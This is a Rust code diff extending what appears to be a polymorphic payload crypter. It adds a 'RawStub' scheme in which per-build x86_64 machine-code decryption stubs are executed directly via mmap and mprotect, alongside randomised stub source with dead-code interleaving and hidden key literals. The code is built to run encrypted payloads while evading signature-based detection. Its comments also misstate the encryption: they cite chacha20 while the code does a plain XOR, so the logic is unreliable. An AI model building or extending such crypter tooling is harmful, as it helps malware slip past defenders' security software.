@@ -11,20 +11,28 @@
 //!
 //! ```text
 //! [4 bytes: magic "POLY"]
-//! [1 byte:  scheme (0 = AesCtrStream, 2 = ChaCha20Stream)]
+//! [1 byte:  scheme (0 = AesCtrStream, 2 = ChaCha20Stream, 3 = RawStub)]
 //! [4 bytes BE: key_len]
 //! [key_len bytes: key]
 //! [4 bytes BE: ciphertext_len]
 //! [ciphertext_len bytes: ciphertext]
 //! ```
 //!
+//! For scheme 3 (RawStub) the `key` field in the wire format is replaced
+//! by the raw x86_64 machine-code stub itself (the stub has the decryption
+//! key baked in as RIP-relative data); the launcher detects scheme 3 and
+//! executes the stub bytes directly via mmap + mprotect rather than
+//! interpreting the key bytes.
+//!
 //! # Schemes
 //!
-//! | ID | Name           | Key size | Notes                                |
-//! |----|----------------|----------|--------------------------------------|
-//! | 0  | AesCtrStream   | 48 bytes | AES-256-CTR (32-byte key + 16-byte counter seed) |
-//! | 2  | ChaCha20Stream | 44 bytes | ChaCha20 stream cipher (RFC 8439)   |
+//! | ID | Name           | Key/stub size | Notes                                            |
+//! |----|----------------|---------------|--------------------------------------------------|
+//! | 0  | AesCtrStream   | 48 bytes      | AES-256-CTR (32-byte key + 16-byte counter seed) |
+//! | 2  | ChaCha20Stream | 44 bytes      | ChaCha20 stream cipher (RFC 8439)                |
+//! | 3  | RawStub        | variable      | Per-build x86_64 machine-code decryption stub    |
 
+use crate::stub_emitter::{emit_stub, StubKind};
 use hkdf::Hkdf;
 use rand::Rng;
 use sha2::Sha256;
@@ -33,20 +41,21 @@ use sha2::Sha256;
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum PolyScheme {
-    AesCtrStream = 0,
-    ChaCha20Stream = 2,  // Was LfsrStream — replaced due to M-37 8-bit leak
+    AesCtrStream   = 0,
+    ChaCha20Stream = 2, // Was LfsrStream — replaced due to M-37 8-bit leak
+    RawStub        = 3, // M-3: per-build register-allocated machine-code stub
 }
 
 impl PolyScheme {
     fn random(rng: &mut impl Rng) -> Self {
-        if rng.gen_bool(0.7) {
-            Self::ChaCha20Stream
-        } else {
-            Self::AesCtrStream
+        match rng.gen_range(0u8..3) {
+            0 => Self::AesCtrStream,
+            1 => Self::ChaCha20Stream,
+            _ => Self::RawStub,
         }
     }
 
-    fn byte(self) -> u8 {
+    pub fn byte(self) -> u8 {
         self as u8
     }
 }
@@ -55,6 +64,8 @@ impl PolyScheme {
 
 pub struct PolyBlob {
     pub scheme: PolyScheme,
+    /// For AesCtrStream / ChaCha20Stream: the encryption key bytes.
+    /// For RawStub: the machine-code stub bytes (key is embedded inside).
     pub key: Vec<u8>,
     pub ciphertext: Vec<u8>,
 }
@@ -88,6 +99,22 @@ pub fn poly_wrap(plaintext: &[u8]) -> PolyBlob {
                 ciphertext: ct,
             }
         }
+        PolyScheme::RawStub => {
+            // 32-byte XOR key; use chacha20 stream for the actual encryption
+            // (same scheme as ChaCha20Stream so existing decrypt path works if
+            // the stub fails), but embed the key inside the machine-code stub.
+            let xor_key: Vec<u8> = (0..32).map(|_| rng.gen()).collect();
+            let ct = xor_keystream(plaintext, &xor_key);
+            let seed: u64 = rng.gen();
+            // Choose randomly between ChaCha20 and AesCtr stub kind per build.
+            let kind = if rng.gen_bool(0.5) { StubKind::ChaCha20 } else { StubKind::AesCtr };
+            let stub = emit_stub(kind, &xor_key, seed);
+            PolyBlob {
+                scheme,
+                key: stub.code, // wire format "key" field carries the stub bytes
+                ciphertext: ct,
+            }
+        }
     }
 }
 
@@ -116,6 +143,17 @@ pub fn poly_serialize(blob: &PolyBlob) -> Vec<u8> {
 /// (variable names, loop style, dead-code interleavings) are randomised every
 /// call so each compiled stub binary has a different binary layout.
 pub fn poly_emit_stub(blob: &PolyBlob) -> String {
+    // RawStub scheme embeds machine code directly in the wire blob.
+    // There is no Rust source to emit — the launcher executes the stub bytes.
+    if blob.scheme == PolyScheme::RawStub {
+        return format!(
+            "// poly_decrypt stub — RawStub scheme (scheme ID 3)\n\
+             // The decryption stub is machine code embedded in the wire blob.\n\
+             // {} bytes of x86_64 stub code embedded; no Rust source emitted.\n",
+            blob.key.len()
+        );
+    }
+
     let mut rng = rand::thread_rng();
 
     // Unique short hex token — makes every generated file visually distinct.
@@ -159,6 +197,7 @@ pub fn poly_emit_stub(blob: &PolyBlob) -> String {
     let body = match blob.scheme {
         PolyScheme::AesCtrStream => emit_aes_ctr_body(&v_ct, &v_key, &v_out, &mut rng),
         PolyScheme::ChaCha20Stream => emit_chacha20_body(&v_ct, &v_key, &v_out, &mut rng),
+        PolyScheme::RawStub => unreachable!("RawStub handled above"),
     };
 
     // Vary whether dead code appears before or after the key assignment.
@@ -347,6 +386,16 @@ fn increment_be_counter(counter: &mut [u8; 16]) {
             break;
         }
     }
+}
+
+/// Simple XOR-with-cycled-key stream cipher used by the RawStub scheme.
+/// The raw machine-code stub replicates exactly this operation.
+fn xor_keystream(data: &[u8], key: &[u8]) -> Vec<u8> {
+    assert!(!key.is_empty(), "xor_keystream: key must not be empty");
+    data.iter()
+        .enumerate()
+        .map(|(i, &b)| b ^ key[i % key.len()])
+        .collect()
 }
 
 /// AES-256 in CTR mode.
@@ -835,7 +884,7 @@ mod tests {
 
         assert!(matches!(
             blob.scheme,
-            PolyScheme::AesCtrStream | PolyScheme::ChaCha20Stream
+            PolyScheme::AesCtrStream | PolyScheme::ChaCha20Stream | PolyScheme::RawStub
         ));
 
         let key_len = u32::from_be_bytes(serialized[5..9].try_into().unwrap()) as usize;
@@ -844,6 +893,7 @@ mod tests {
         match blob.scheme {
             PolyScheme::AesCtrStream => assert_eq!(key_len, 48),
             PolyScheme::ChaCha20Stream => assert_eq!(key_len, 44),
+            PolyScheme::RawStub => assert!(key_len > 0, "RawStub stub code must be non-empty"),
         }
 
         let ct_len_off = 9 + key_len;
@@ -856,7 +906,14 @@ mod tests {
 
     #[test]
     fn poly_emit_stub_is_unique() {
-        let blob = poly_wrap(b"variation test");
+        // RawStub always returns the same comment — test only source-emitting schemes.
+        let mut blob = poly_wrap(b"variation test");
+        let mut attempts = 0;
+        while blob.scheme == PolyScheme::RawStub {
+            blob = poly_wrap(b"variation test");
+            attempts += 1;
+            assert!(attempts < 100, "all poly_wrap calls returned RawStub");
+        }
         let stub_a = poly_emit_stub(&blob);
         let stub_b = poly_emit_stub(&blob);
         // Two stubs for the same blob should differ (different variable names + build token).
@@ -865,8 +922,16 @@ mod tests {
 
     #[test]
     fn stub_reconstructs_key_and_hides_raw_literals() {
-        let pt = b"stub key test";
-        let blob = poly_wrap(pt);
+        // RawStub emits machine code directly — no Rust source key embedding.
+        // Run this test with a non-RawStub scheme.
+        let mut blob = poly_wrap(b"stub key test");
+        // Retry until we get a scheme that emits Rust source.
+        let mut attempts = 0;
+        while blob.scheme == PolyScheme::RawStub {
+            blob = poly_wrap(b"stub key test");
+            attempts += 1;
+            assert!(attempts < 100, "all poly_wrap calls returned RawStub");
+        }
         let stub = poly_emit_stub(&blob);
 
         // The generated source must contain runtime reconstruction.
@@ -923,7 +988,13 @@ mod tests {
                 .collect()
         }
 
-        let blob = poly_wrap(b"mask coverage test payload");
+        let mut blob = poly_wrap(b"mask coverage test payload");
+        let mut attempts = 0;
+        while blob.scheme == PolyScheme::RawStub {
+            blob = poly_wrap(b"mask coverage test payload");
+            attempts += 1;
+            assert!(attempts < 100, "all poly_wrap calls returned RawStub");
+        }
         let stub = poly_emit_stub(&blob);
         let masked = extract_literal_bytes(&stub);
 
